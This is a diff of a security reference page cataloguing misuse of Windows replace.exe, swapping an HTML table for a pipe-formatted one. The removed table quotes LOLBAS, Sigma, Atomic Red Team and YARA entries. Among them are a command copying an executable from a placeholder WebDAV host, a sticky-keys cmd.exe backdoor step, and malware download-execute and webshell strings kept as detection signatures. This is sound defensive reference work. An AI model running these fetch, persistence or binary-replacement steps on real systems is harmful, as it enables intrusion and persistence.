@@ -331,378 +331,73 @@
 
 <p><em>The following table contains possible examples of <code class="language-plaintext highlighter-rouge">replace.exe</code> being misused. While <code class="language-plaintext highlighter-rouge">replace.exe</code> is <strong>not</strong> inherently malicious, its legitimate functionality can be abused for malicious purposes.</em></p>
 
-<table>
-  <thead>
-    <tr>
-      <th>Source</th>
-      <th>Source File</th>
-      <th>Example</th>
-      <th>License</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/network/cisco/aaa/cisco_cli_moving_data.yml">cisco_cli_moving_data.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- 'configure replace'</code></td>
-      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/AcroRd32.yml">AcroRd32.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: Replace C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe by your binary</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/ROCCAT_Swarm.yml">ROCCAT_Swarm.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: Replace ROCCAT_Swarm_Monitor.exe with your binary.exe</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Name: Replace.exe</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Description: Used to replace file with another file </code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: replace.exe C:\Source\File.cab C:\Destination /A</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\System32\replace.exe</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\SysWOW64\replace.exe</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
-      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Replace.yml">Replace.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- IOC: Replace.exe getting files from remote server</code></td>
-      <td> </td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json">misp_invisimole.json</a></td>
-      <td><code class="language-plaintext highlighter-rouge">"description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/kryptocibule/nouns.txt">nouns.txt</a></td>
-      <td><code class="language-plaintext highlighter-rouge">replace</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc">stantinko</a></td>
-      <td><code class="language-plaintext highlighter-rouge">var c = a[b].toLocaleLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/stantinko/README.adoc">stantinko</a></td>
-      <td><code class="language-plaintext highlighter-rouge">a = a.toLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/turla/misp-turla-outlook-event.json">misp-turla-outlook-event.json</a></td>
-      <td><code class="language-plaintext highlighter-rouge">"description": "The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system.[[Citation: Microsoft Component Object Model]] Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[[Citation: GDATA COM Hijacking]] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\n\nDetection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within &lt;code&gt;HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&lt;\/code&gt; may be anomalous and should be investigated since user objects will be loaded prior to machine objects in &lt;code&gt;HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\&lt;\/code&gt;.[[Citation: Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10\n\nData Sources: Windows Registry, DLL monitoring, Loaded DLLs\n\nContributors: ENDGAME",</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/windigo/README.adoc">windigo</a></td>
-      <td><code class="language-plaintext highlighter-rouge">replace:</code></td>
-      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a></td>
-      <td>ℹ Please replace this with what you did.</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a></td>
-      <td>ℹ Please replace this with what you expected to happen.</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md">problem_report.md</a></td>
-      <td>ℹ Please replace this with of what happened instead.</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
-      <td>- Atomic Test #2: Replace binary of sticky keys [windows]</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
-      <td>- Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux]</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md">linux-index.md</a></td>
-      <td>- Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux]</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/macos-index.md">macos-index.md</a></td>
-      <td>- Atomic Test #1: Cron - Replace crontab with referenced file [macos, linux]</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
-      <td>- Atomic Test #2: Replace binary of sticky keys [windows]</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
-      <td>$cleanupUpdatedValue = $cleanupUpdatedValue -replace ‘,NPPSpy’,’’</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md">T1053.003.md</a></td>
-      <td>- <a href="#atomic-test-1---cron---replace-crontab-with-referenced-file">Atomic Test #1 - Cron - Replace crontab with referenced file</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md">T1053.003.md</a></td>
-      <td>## Atomic Test #1 - Cron - Replace crontab with referenced file</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md">T1070.006.md</a></td>
-      <td>| target_date_time | Date/time to replace original timestamps with | String | 01/01/1970 00:00:00|</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md">T1098.md</a></td>
-      <td>$account = $member.Name -replace “.+\",”” # strip computername\</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a></td>
-      <td>- <a href="#atomic-test-2---replace-binary-of-sticky-keys">Atomic Test #2 - Replace binary of sticky keys</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a></td>
-      <td>## Atomic Test #2 - Replace binary of sticky keys</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md">T1546.008.md</a></td>
-      <td>Replace sticky keys binary (sethc.exe) with cmd.exe</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md">T1547.009.md</a></td>
-      <td>Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.&lt;/blockquote&gt;</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.md">T1558.001.md</a></td>
-      <td>”@ -Replace “DOMAIN_SID”, $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564/T1564.md">T1564.md</a></td>
-      <td>$macro = $macro -replace “aREPLACEMEa”, “PathToAtomicsFolder\T1564\bin\extractme.bin”</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md">T1574.001.md</a></td>
-      <td>Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.&lt;/blockquote&gt;</td>
-      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt29_grizzly_steppe.yar">apt_apt29_grizzly_steppe.yar</a></td>
-      <td>$s2 = “Repeat last find command)Replace specific text with different text” fullword wide</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$x1 = “Get-Content $env:Public\Libraries\update.vbs) -replace” ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$x3 = “CreateObject("WScript.Shell").Run Replace(DownloadExecute,"-_","bat")” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$s4 = “’) -replace ‘__’,(‘DNS’+$id) | “ fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$s7 = “’) -replace ‘__’,(‘HTP’+$id) | “ fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$x1 = “wss.Run "powershell.exe " &amp; Chr(34) &amp; "&amp; {(Get-Content $env:Public\Libraries\update.vbs) -replace ‘__’,(Get-Random) | Set-C” ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$x1 = “(Get-Content $env:Public\Libraries\dns.ps1) -replace (‘#’+’##’),$botid | Set-Content $env:Public\Libraries\dns.ps1” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
-      <td>$one5 = “cu = Replace(cu, "$", "")” ascii wide</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_winnti_hdroot.yar">apt_winnti_hdroot.yar</a></td>
-      <td>$s8 = “tera replace dll config” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/cn_pentestset_webshells.yar">cn_pentestset_webshells.yar</a></td>
-      <td>$s2 = “strReturn=Replace(strReturn,chr(43),"%2B")  ‘JMDCW” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/crime_goldeneye.yar">crime_goldeneye.yar</a></td>
-      <td>$x1 = “fso.GetTempName();tmp_path = tmp_path.replace(‘.tmp’, ‘.exe’)” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar">gen_cert_payloads.yar</a></td>
-      <td>$fp1 = “replace it with the PEM-encoded root certificate”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_fireeye_redteam_tools.yar">gen_fireeye_redteam_tools.yar</a></td>
-      <td>$s2 = “[1].replace(‘unsigned char buf[] = "’”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_invoke_thehash.yar">gen_invoke_thehash.yar</a></td>
-      <td>$s1 = “$process_ID = $process_ID -replace "-00-00",""” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mimikatz.yar">gen_mimikatz.yar</a></td>
-      <td>$x9 = “\_ *Password replace -&gt;” fullword wide ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_empire.yar">gen_powershell_empire.yar</a></td>
-      <td>$s3 = “$PersistantScript = $PersistantScript.ToString().Replace(‘EXECUTEFUNCTION’, "$PersistenceScriptName -Persist")” fullword ascii</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s3 = “MorfiCoder=Replace(Replace(StrReverse(Code),"/<em>/",""""),"\</em>\",vbCrlf)” fullword</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s4 = “echo " &lt;a href=""/"&amp;encodeForUrl(theHref,false)&amp;""" target=_blank&gt;"&amp;replace”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s8 = “theHref=mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2)”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s3 = “echo " &lt;a href=""/"&amp;encodeForUrl(theHref,false)&amp;""" target=_blank&gt;"&amp;replace”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s9 = “theHref=mid(replace(lcase(list.path),lcase(server.mapPath("/")),""),2)”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s3 = “If ProxyData &lt;&gt; "" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, "<br />")”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s7 = “theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath("/")),"")”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar">thor-webshells.yar</a></td>
-      <td>$s8 = “Obviously you replace the ip address with that of the target.”</td>
-      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
-    </tr>
-  </tbody>
-</table>
+<p>Source | Source File | Example | License
+– | – | – | –
+<a href="https://github.com/Neo23x0/sigma">sigma</a> | <a href="https://github.com/Neo23x0/sigma/blob/master/rules/network/cisco/aaa/cisco_cli_moving_data.yml">cisco_cli_moving_data.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">configure</span><span class="nv"> </span><span class="s">replace'</span></code> | <a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a>
+<a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a> | <a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/AcroRd32.yml">AcroRd32.yml</a> | <code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">Replace C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe by your binary</span></code> | 
